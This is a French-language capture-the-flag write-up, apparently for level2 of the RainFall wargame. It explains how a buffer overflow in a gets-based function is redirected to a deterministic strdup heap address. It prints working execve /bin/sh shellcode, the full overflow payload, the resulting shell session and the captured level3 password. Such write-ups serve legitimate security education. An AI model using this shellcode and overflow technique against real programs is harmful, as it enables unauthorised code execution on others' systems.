## Le programme

Ici on a un main qui appelle simplement une fonction `p()`. La fonction en question utilise `gets` comme l'exercice précédent mais une vérification rend impossible le buffer overflow à ce moment de la fonction. Un shellcode qui ferait `execve /bin/sh` aurait ceci dit pu fonctionner sans ce check. Il y a ceci dit un `strdup` sur lequel on va pouvoir se pencher.

## La faille

L'idée est de récupérer l'adresse de `strdup`. On se rend d'ailleurs compte que son adresse est déterministe grace à `ltrace`. 

adresse de strdup: `0x0804a008`

Il faut maintenant construire la string qui nous permettra d'overflow et de glisser un shellcode dedans.

## La solution

```level2@RainFall:~$ printf "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab\x08\xa0\x04\x08" > /tmp/level2
level2@RainFall:~$ cat /tmp/level2 - | ./level2 

1���
    Qh//shh/bin��̀Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab35Ab6Ab7Ab8A�
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

on utilise encore une fois cat - pour avoir un shell qui ne se ferme pas
le shellcode qui contient le execve /bin/sh est execute dans le strdup.
